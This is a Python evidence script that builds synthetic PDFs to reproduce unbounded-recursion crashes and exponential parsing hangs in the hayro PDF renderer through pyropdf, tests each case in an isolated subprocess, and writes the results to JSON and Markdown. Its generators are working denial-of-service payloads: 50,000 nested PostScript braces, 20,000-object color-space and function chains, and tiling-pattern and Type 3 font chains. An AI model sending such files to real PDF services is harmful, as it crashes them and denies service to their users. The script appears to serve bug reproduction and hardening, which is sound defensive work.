# ruff: noqa: INP001 - standalone evidence script.
"""Reproduce hayro/hayro-syntax unbounded recursion and DoS paths under DocumentLimits.web().

Runs each synthetic PDF in an isolated child process so stack overflows (SIGSEGV)
or exponential hangs do not terminate the harness. Records PDF byte size, exit
status/signal, exception type, and elapsed time to JSON and Markdown.

Usage:
    uv run python evidence/preflight-guard/reproduce_crashes.py evidence/preflight-guard/results
"""

from __future__ import annotations

import argparse
import json
import platform
import signal
import subprocess
import sys
import time
import zlib
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import TYPE_CHECKING

import pyropdf

if TYPE_CHECKING:
    from collections.abc import Callable

DEFAULT_TIMEOUT_S = 15.0
METHODS = ("text", "pixmap", "content", "svg", "operations")


def build_pdf(objects: list[bytes]) -> bytes:
    """Assemble a minimal PDF 1.7 with 1-based indirect objects and an xref table."""
    out = bytearray(b"%PDF-1.7\n")
    offsets: list[int] = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += f"{number} 0 obj\n".encode("ascii") + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode("ascii")
    out += b"".join(f"{offset:010d} 00000 n \n".encode("ascii") for offset in offsets)
    out += f"trailer\n<</Size {len(objects) + 1}/Root 1 0 R>>\nstartxref\n{xref}\n%%EOF\n".encode("ascii")
    return bytes(out)


def one_page(
    content: bytes,
    resources: bytes = b"<<>>",
    extra: list[bytes] | None = None,
    *,
    compress: bool = False,
) -> bytes:
    """Build a single-page PDF whose content stream is object 4 and extra objects start at 5."""
    if compress:
        payload = zlib.compress(content, 9)
        header = f"<</Length {len(payload)}/Filter/FlateDecode>>stream\n".encode("ascii")
        content_obj = header + payload + b"\nendstream"
    else:
        content_obj = f"<</Length {len(content)}>>stream\n".encode("ascii") + content + b"\nendstream"
    objects = [
        b"<</Type/Catalog/Pages 2 0 R>>",
        b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
        b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]/Resources " + resources + b"/Contents 4 0 R>>",
        content_obj,
        *(extra or []),
    ]
    return build_pdf(objects)


def make_type4_shading(depth: int) -> bytes:
    """Issue #15: Type 4 PostScript shading function with `depth` nested brace pairs."""
    program = b"{" * depth + b"}" * depth
    func = f"<</FunctionType 4/Domain[0 1]/Range[0 1]/Length {len(program)}>>stream\n".encode("ascii")
    func += program + b"\nendstream"
    shading = b"<</ShadingType 2/ColorSpace/DeviceGray/Coords[0 0 200 0]/Function 6 0 R>>"
    return one_page(b"/Sh0 sh", b"<</Shading<</Sh0 5 0 R>>>>", [shading, func])


def make_type4_separation(depth: int) -> bytes:
    """Issue #15: Type 4 PostScript tint transform reached via Separation color space."""
    program = b"{" * depth + b"}" * depth
    func = f"<</FunctionType 4/Domain[0 1]/Range[0 1]/Length {len(program)}>>stream\n".encode("ascii")
    func += program + b"\nendstream"
    cs = b"[/Separation /Spot /DeviceGray 6 0 R]"
    return one_page(b"/CS0 cs 0.5 scn 0 0 50 50 re f", b"<</ColorSpace<</CS0 5 0 R>>>>", [cs, func])


def make_type4_extgstate_tr(depth: int) -> bytes:
    """Issue #15: Type 4 PostScript transfer function reached via ExtGState /TR."""
    program = b"{" * depth + b"}" * depth
    func = f"<</FunctionType 4/Domain[0 1]/Range[0 1]/Length {len(program)}>>stream\n".encode("ascii")
    func += program + b"\nendstream"
    gs = b"<</Type/ExtGState/TR 6 0 R>>"
    return one_page(b"/GS0 gs 0 0 50 50 re f", b"<</ExtGState<</GS0 5 0 R>>>>", [gs, func])


def make_type3_function_cycle() -> bytes:
    """Issue #15: 1-object cyclic Type 3 stitching function."""
    shading = b"<</ShadingType 2/ColorSpace/DeviceGray/Coords[0 0 200 0]/Function 6 0 R>>"
    func = b"<</FunctionType 3/Domain[0 1]/Bounds[]/Encode[0 1]/Functions[6 0 R]>>"
    return one_page(b"/Sh0 sh", b"<</Shading<</Sh0 5 0 R>>>>", [shading, func])


def make_type3_function_chain(length: int) -> bytes:
    """Issue #15: Acyclic chain of `length` indirect Type 3 stitching functions."""
    shading = b"<</ShadingType 2/ColorSpace/DeviceGray/Coords[0 0 200 0]/Function 6 0 R>>"
    extra: list[bytes] = [shading]
    for idx in range(length):
        next_obj = 6 + idx + 1
        extra.append(f"<</FunctionType 3/Domain[0 1]/Bounds[]/Encode[0 1]/Functions[{next_obj} 0 R]>>".encode("ascii"))
    extra.append(b"<</FunctionType 2/Domain[0 1]/C0[0]/C1[1]/N 1>>")
    return one_page(b"/Sh0 sh", b"<</Shading<</Sh0 5 0 R>>>>", extra)


def make_cs_indexed_cycle() -> bytes:
    """Issue #15: 1-object cyclic Indexed color space."""
    return one_page(
        b"/CS0 cs 0 scn 0 0 50 50 re f",
        b"<</ColorSpace<</CS0 5 0 R>>>>",
        [b"[/Indexed 5 0 R 0 <00>]"],
    )


def make_cs_indexed_chain(length: int) -> bytes:
    """Issue #15: Acyclic chain of `length` indirect Indexed color spaces."""
    extra: list[bytes] = []
    for idx in range(length):
        next_obj = 5 + idx + 1
        extra.append(f"[/Indexed {next_obj} 0 R 0 <00>]".encode("ascii"))
    extra.append(b"/DeviceGray")
    return one_page(b"/CS0 cs 0 scn 0 0 50 50 re f", b"<</ColorSpace<</CS0 5 0 R>>>>", extra)


def make_cs_separation_chain(length: int) -> bytes:
    """Issue #15: Acyclic chain of `length` indirect Separation color spaces."""
    tint_num = 5 + length + 1
    extra: list[bytes] = []
    for idx in range(length):
        next_obj = 5 + idx + 1
        extra.append(f"[/Separation /S{idx} {next_obj} 0 R {tint_num} 0 R]".encode("ascii"))
    extra.append(b"/DeviceGray")
    extra.append(b"<</FunctionType 2/Domain[0 1]/C0[0]/C1[1]/N 1>>")
    return one_page(b"/CS0 cs 0.5 scn 0 0 50 50 re f", b"<</ColorSpace<</CS0 5 0 R>>>>", extra)


def make_cs_icc_alternate_chain(length: int) -> bytes:
    """Issue #15: Acyclic chain of `length` invalid ICCBased spaces falling back via /Alternate."""
    extra: list[bytes] = []
    for idx in range(length):
        icc_obj = 5 + 2 * idx + 1
        next_cs = 5 + 2 * idx + 2
        extra.append(f"[/ICCBased {icc_obj} 0 R]".encode("ascii"))
        extra.append(f"<</N 3/Alternate {next_cs} 0 R/Length 4>>stream\nxxxx\nendstream".encode("ascii"))
    extra.append(b"/DeviceRGB")
    return one_page(b"/CS0 cs 0 0 0 scn 0 0 50 50 re f", b"<</ColorSpace<</CS0 5 0 R>>>>", extra)


def make_inline_images(count: int) -> bytes:
    """Issue #740: Repeated inline images with trailing stray `EI` token."""
    return one_page(b"BI /W 1 /H 1 ID x EI EI " * count, compress=True)


def make_tiling_pattern_chain(length: int) -> bytes:
    """Audit finding: acyclic chain of `length` Type 1 tiling patterns (TilingPattern::interpret omits depth check)."""
    extra: list[bytes] = []
    for idx in range(length):
        obj_num = 5 + idx
        if idx + 1 < length:
            cell = f"/Pattern cs /P{idx + 1} scn 0 0 10 10 re f".encode("ascii")
            res = f"<</Pattern<</P{idx + 1} {obj_num + 1} 0 R>>>>".encode("ascii")
        else:
            cell = b"1 0 0 rg 0 0 10 10 re f"
            res = b"<<>>"
        pat = (
            b"<</Type/Pattern/PatternType 1/PaintType 1/TilingType 1"
            b"/BBox[0 0 10 10]/XStep 10/YStep 10/Resources "
            + res
            + f"/Length {len(cell)}>>stream\n".encode("ascii")
            + cell
            + b"\nendstream"
        )
        extra.append(pat)
    return one_page(
        b"/Pattern cs /P0 scn 0 0 50 50 re f",
        b"<</Pattern<</P0 5 0 R>>>>",
        extra,
    )


def make_type3_glyph_chain(length: int) -> bytes:
    """Audit finding: acyclic chain of `length` Type 3 fonts (Type3::render_glyph omits depth check)."""
    extra: list[bytes] = []
    for idx in range(length):
        font_num = 5 + 2 * idx
        cp_num = font_num + 1
        if idx + 1 < length:
            next_font = 5 + 2 * (idx + 1)
            proc = f"100 0 d0 BT /F{idx + 1} 10 Tf (a) Tj ET".encode("ascii")
            res = f"<</Font<</F{idx + 1} {next_font} 0 R>>>>".encode("ascii")
        else:
            proc = b"100 0 d0 0 0 50 50 re f"
            res = b"<<>>"
        font = (
            b"<</Type/Font/Subtype/Type3/FontBBox[0 0 100 100]/FontMatrix[0.01 0 0 0.01 0 0]"
            + f"/CharProcs<</a {cp_num} 0 R>>/Encoding<</Type/Encoding/Differences[97 /a]>>".encode("ascii")
            + b"/FirstChar 97/LastChar 97/Widths[100]/Resources "
            + res
            + b">>"
        )
        cp = f"<</Length {len(proc)}>>stream\n".encode("ascii") + proc + b"\nendstream"
        extra.extend([font, cp])
    return one_page(
        b"BT /F0 10 Tf (a) Tj ET",
        b"<</Font<</F0 5 0 R>>>>",
        extra,
    )


def make_form_xobject_cycle() -> bytes:
    """Control: self-referential Form XObject (bounded at 50 by hayro's begin_nested_interpretation)."""
    body = b"/Fm0 Do"
    form = (
        b"<</Type/XObject/Subtype/Form/BBox[0 0 100 100]"
        b"/Resources<</XObject<</Fm0 5 0 R>>>>"
        + f"/Length {len(body)}>>stream\n".encode("ascii")
        + body
        + b"\nendstream"
    )
    return one_page(b"/Fm0 Do", b"<</XObject<</Fm0 5 0 R>>>>", [form])


def make_soft_mask_cycle() -> bytes:
    """Control: self-referential SoftMask group (bounded at 50 via FormXObject::draw)."""
    body = b"/GS0 gs 0 0 50 50 re f"
    group = (
        b"<</Type/XObject/Subtype/Form/BBox[0 0 100 100]"
        b"/Group<</S/Transparency/CS/DeviceGray>>"
        b"/Resources<</ExtGState<</GS0 5 0 R>>>>"
        + f"/Length {len(body)}>>stream\n".encode("ascii")
        + body
        + b"\nendstream"
    )
    gs = b"<</Type/ExtGState/SMask<</Type/Mask/S/Alpha/G 6 0 R>>>>"
    return one_page(b"/GS0 gs 0 0 50 50 re f", b"<</ExtGState<</GS0 5 0 R>>>>", [gs, group])


def make_object_depth(depth: int) -> bytes:
    """Control: indirect object with `depth` nested arrays (caught by DocumentLimits.web max_object_depth=64)."""
    nested = b"[" * depth + b"1" + b"]" * depth
    return one_page(b"q Q", b"<</Extra 5 0 R>>", [nested])


def make_content_operand_depth(depth: int) -> bytes:
    """Control for #1666: content stream operand nested past hayro-syntax's 512 cap (silently truncated)."""
    payload = b"[" * depth + b"]" * depth + b" pop BT /F1 12 Tf (after) Tj ET"
    return one_page(payload, b"<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>>>>>")


@dataclass(frozen=True, slots=True)
class Case:
    """One synthetic crash/DoS or control test vector."""

    name: str
    category: str
    issue: str
    description: str
    builder: Callable[[], bytes]
    methods: tuple[str, ...] = ("text", "pixmap", "content", "svg")


CASES: tuple[Case, ...] = (
    Case(
        name="type4-braces-20000",
        category="control",
        issue="#15",
        description="Type 4 shading procedure with 20,000 nested braces (below macOS 8 MiB stack overflow)",
        builder=lambda: make_type4_shading(20_000),
        methods=("text", "pixmap", "content"),
    ),
    Case(
        name="type4-braces-50000",
        category="crash",
        issue="#15",
        description="Type 4 shading procedure with 50,000 nested braces",
        builder=lambda: make_type4_shading(50_000),
        methods=("text", "pixmap", "content", "svg"),
    ),
    Case(
        name="type4-braces-50000-separation",
        category="crash",
        issue="#15",
        description="Type 4 tint transform (50,000 braces) inside Separation color space",
        builder=lambda: make_type4_separation(50_000),
        methods=("text", "pixmap", "content"),
    ),
    Case(
        name="type4-braces-50000-extgstate-tr",
        category="crash",
        issue="#15",
        description="Type 4 transfer function (50,000 braces) inside ExtGState /TR",
        builder=lambda: make_type4_extgstate_tr(50_000),
        methods=("text", "pixmap", "content"),
    ),
    Case(
        name="type3-function-cycle",
        category="control",
        issue="#15",
        description="1-object cyclic Type 3 function (broken by hayro-syntax parent_chain)",
        builder=make_type3_function_cycle,
        methods=("text", "pixmap"),
    ),
    Case(
        name="type3-function-chain-20000",
        category="crash",
        issue="#15",
        description="20,000-object acyclic indirect Type 3 stitching function chain",
        builder=lambda: make_type3_function_chain(20_000),
        methods=("text", "pixmap", "content", "svg"),
    ),
    Case(
        name="cs-indexed-cycle",
        category="control",
        issue="#15",
        description="1-object cyclic Indexed CS (broken by hayro-syntax parent_chain)",
        builder=make_cs_indexed_cycle,
        methods=("text", "pixmap"),
    ),
    Case(
        name="cs-indexed-chain-20000",
        category="crash",
        issue="#15",
        description="20,000-object acyclic indirect Indexed color space chain",
        builder=lambda: make_cs_indexed_chain(20_000),
        methods=("text", "pixmap", "content", "svg"),
    ),
    Case(
        name="cs-separation-chain-20000",
        category="crash",
        issue="#15",
        description="20,000-object acyclic indirect Separation alternate color space chain",
        builder=lambda: make_cs_separation_chain(20_000),
        methods=("text", "pixmap", "content"),
    ),
    Case(
        name="cs-icc-alternate-chain-10000",
        category="crash",
        issue="#15",
        description="10,000-level acyclic invalid ICCBased /Alternate fallback chain",
        builder=lambda: make_cs_icc_alternate_chain(10_000),
        methods=("text", "pixmap", "content"),
    ),
    Case(
        name="inline-image-nested-22",
        category="exponential",
        issue="#740",
        description="22 repeated `BI /W 1 /H 1 ID x EI EI ` inline images",
        builder=lambda: make_inline_images(22),
        methods=("text", "pixmap", "content", "operations"),
    ),
    Case(
        name="inline-image-nested-25",
        category="exponential",
        issue="#740",
        description="25 repeated `BI /W 1 /H 1 ID x EI EI ` inline images",
        builder=lambda: make_inline_images(25),
        methods=("text", "pixmap", "operations"),
    ),
    Case(
        name="inline-image-nested-200000",
        category="crash",
        issue="#740",
        description="200,000 repeated `BI /W 1 /H 1 ID x EI EI ` inline images (12 KB Flate PDF)",
        builder=lambda: make_inline_images(200_000),
        methods=("text", "pixmap", "content", "operations"),
    ),
    Case(
        name="tiling-pattern-chain-2000",
        category="crash",
        issue="new-audit",
        description="2,000-level acyclic Type 1 tiling pattern chain (unbounded TilingPattern::interpret)",
        builder=lambda: make_tiling_pattern_chain(2_000),
        methods=("text", "pixmap", "content", "svg"),
    ),
    Case(
        name="type3-glyph-chain-2000",
        category="crash",
        issue="new-audit",
        description="2,000-level acyclic Type 3 glyph chain (unbounded Type3::render_glyph)",
        builder=lambda: make_type3_glyph_chain(2_000),
        methods=("text", "pixmap", "content", "svg"),
    ),
    Case(
        name="form-xobject-cycle",
        category="control",
        issue="hayro-bounded",
        description="Self-referential Form XObject (capped at 50 in hayro)",
        builder=make_form_xobject_cycle,
        methods=("text", "pixmap", "content"),
    ),
    Case(
        name="soft-mask-cycle",
        category="control",
        issue="hayro-bounded",
        description="Self-referential SoftMask group (capped at 50 via FormXObject::draw)",
        builder=make_soft_mask_cycle,
        methods=("text", "pixmap", "content"),
    ),
    Case(
        name="object-depth-65",
        category="control",
        issue="store-bounded",
        description="Indirect object nested 65 arrays deep (refused at open by DocumentLimits.web)",
        builder=lambda: make_object_depth(65),
        methods=("text",),
    ),
    Case(
        name="content-operand-depth-600",
        category="truncation",
        issue="#15/#1666",
        description="Content stream array nested 600 deep (silently truncated by hayro-syntax at 512)",
        builder=lambda: make_content_operand_depth(600),
        methods=("text", "pixmap", "content", "operations"),
    ),
)

CASES_BY_NAME = {case.name: case for case in CASES}


@dataclass(frozen=True, slots=True)
class Outcome:
    """Observed subprocess outcome for one (case, method) pair."""

    case: str
    category: str
    issue: str
    method: str
    pdf_bytes: int
    status: str
    returncode: int | None
    signal_name: str | None
    detail: str
    elapsed_ms: float


def run_worker(case_name: str, method: str) -> None:
    """Execute one synthetic PDF under DocumentLimits.web() inside a child process."""
    if method not in METHODS:
        msg = f"unknown method: {method}"
        raise ValueError(msg)
    case = CASES_BY_NAME[case_name]
    data = case.builder()
    try:
        doc = pyropdf.open(data, limits=pyropdf.DocumentLimits.web())
        page = doc.pages[0]
        if method == "text":
            result = page.text()
            payload = {"outcome": "returned", "detail": f"len={len(result)} text={result!r}"}
        elif method == "pixmap":
            pix = page.pixmap()
            payload = {"outcome": "returned", "detail": f"{pix.width}x{pix.height}"}
        elif method == "content":
            items = page.content()
            payload = {"outcome": "returned", "detail": f"items={len(items)}"}
        elif method == "svg":
            svg = page.svg()
            payload = {"outcome": "returned", "detail": f"len={len(svg)}"}
        else:
            ops = page.operations
            payload = {"outcome": "returned", "detail": f"ops={len(ops)}"}
    except pyropdf.LimitError as err:
        payload = {"outcome": "limit_error", "detail": f"{err.code}: {err}"}
    except Exception as err:  # noqa: BLE001 - report exact exception class for evidence
        payload = {"outcome": "exception", "detail": f"{type(err).__name__}: {err}"}
    sys.stdout.write(json.dumps(payload) + "\n")


def signal_label(returncode: int) -> str | None:
    """Translate a negative POSIX return code into its signal name."""
    if returncode >= 0:
        return None
    sig_num = -returncode
    try:
        return signal.Signals(sig_num).name
    except ValueError:
        return f"SIG{sig_num}"


def run_isolated(case: Case, method: str, timeout_s: float) -> Outcome:
    """Spawn a child process to evaluate `(case, method)` safely."""
    pdf_bytes = len(case.builder())
    cmd = [sys.executable, __file__, "--worker", case.name, method]
    started = time.perf_counter()
    try:
        completed = subprocess.run(  # noqa: S603 - fixed local script invocation
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout_s,
            check=False,
        )
    except subprocess.TimeoutExpired:
        elapsed_ms = (time.perf_counter() - started) * 1e3
        return Outcome(
            case=case.name,
            category=case.category,
            issue=case.issue,
            method=method,
            pdf_bytes=pdf_bytes,
            status="timeout",
            returncode=None,
            signal_name=None,
            detail=f"timed out after {timeout_s:.1f}s",
            elapsed_ms=round(elapsed_ms, 2),
        )
    elapsed_ms = (time.perf_counter() - started) * 1e3
    if completed.returncode != 0:
        sig = signal_label(completed.returncode)
        stderr_line = (completed.stderr.strip().splitlines() or [""])[-1][:160]
        return Outcome(
            case=case.name,
            category=case.category,
            issue=case.issue,
            method=method,
            pdf_bytes=pdf_bytes,
            status="crash" if sig is not None else "nonzero_exit",
            returncode=completed.returncode,
            signal_name=sig,
            detail=stderr_line or f"exit {completed.returncode}",
            elapsed_ms=round(elapsed_ms, 2),
        )
    lines = [line for line in completed.stdout.splitlines() if line.strip()]
    parsed = json.loads(lines[-1]) if lines else {"outcome": "unknown", "detail": ""}
    return Outcome(
        case=case.name,
        category=case.category,
        issue=case.issue,
        method=method,
        pdf_bytes=pdf_bytes,
        status=str(parsed["outcome"]),
        returncode=0,
        signal_name=None,
        detail=str(parsed["detail"]),
        elapsed_ms=round(elapsed_ms, 2),
    )


def format_markdown(outcomes: list[Outcome], timeout_s: float) -> str:
    """Render a summary Markdown table of subprocess outcomes."""
    lines = [
        "# Reproducible crash, exponential-parse, and truncation corpus under `DocumentLimits.web()`",
        "",
        f"- Platform: `{platform.system()} {platform.machine()}`",
        f"- Python: `{platform.python_version()}`",
        f"- pyropdf: `{pyropdf.__version__}`",
        f"- Per-case timeout: `{timeout_s:.1f}s`",
        "",
        "| Case | Issue | PDF bytes | Method | Outcome | Signal / Exit | Time (ms) | Detail |",
        "| --- | --- | ---: | --- | --- | --- | ---: | --- |",
    ]
    for item in outcomes:
        sig = item.signal_name or ("" if item.returncode is None else str(item.returncode))
        if item.returncode is not None and item.returncode < 0:
            sig = f"{sig} (exit {128 - item.returncode})"
        call = f"page.{item.method}" if item.method == "operations" else f"page.{item.method}()"
        lines.append(
            f"| `{item.case}` | {item.issue} | {item.pdf_bytes:,} | `{call}` "
            f"| **{item.status}** | {sig} | {item.elapsed_ms:.1f} | `{item.detail}` |"
        )
    return "\n".join(lines) + "\n"


def main(argv: list[str] | None = None) -> int:
    """Run either one worker case or the full isolated corpus."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("out_dir", nargs="?", type=Path, help="output directory for JSON and Markdown")
    parser.add_argument("--worker", nargs=2, metavar=("CASE", "METHOD"), help=argparse.SUPPRESS)
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT_S, help="per-case timeout in seconds")
    args = parser.parse_args(argv)
    if args.worker:
        run_worker(args.worker[0], args.worker[1])
        return 0
    if args.out_dir is None:
        parser.error("out_dir is required unless --worker is specified")
    outcomes: list[Outcome] = []
    for case in CASES:
        for method in case.methods:
            outcome = run_isolated(case, method, args.timeout)
            outcomes.append(outcome)
            sys.stderr.write(
                f"{outcome.case:30s} {outcome.method:10s} -> {outcome.status:12s} "
                f"{outcome.signal_name or '':8s} {outcome.elapsed_ms:8.1f}ms  {outcome.detail}\n"
            )
            sys.stderr.flush()
    args.out_dir.mkdir(parents=True, exist_ok=True)
    payload = {
        "platform": f"{platform.system()} {platform.machine()}",
        "python": platform.python_version(),
        "pyropdf": pyropdf.__version__,
        "timeout_s": args.timeout,
        "cases": [
            {
                "name": case.name,
                "category": case.category,
                "issue": case.issue,
                "description": case.description,
                "pdf_bytes": len(case.builder()),
            }
            for case in CASES
        ],
        "outcomes": [asdict(item) for item in outcomes],
    }
    (args.out_dir / "crashes.json").write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    (args.out_dir / "crashes.md").write_text(format_markdown(outcomes, args.timeout), encoding="utf-8")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
